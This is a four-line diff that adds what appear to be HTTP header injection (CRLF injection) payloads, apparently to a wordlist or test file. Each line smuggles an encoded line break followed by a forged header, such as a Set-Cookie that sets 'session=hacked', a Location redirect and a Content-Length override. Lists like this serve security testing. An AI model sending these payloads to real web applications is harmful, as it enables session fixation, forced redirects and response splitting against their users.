@@ -1,0 +1,4 @@
+%0d%0aSet-Cookie:session=hacked
+%0aSet-Cookie:session=hacked
+\r\nLocation: http://google.com
+%0d%0aContent-Length: 0
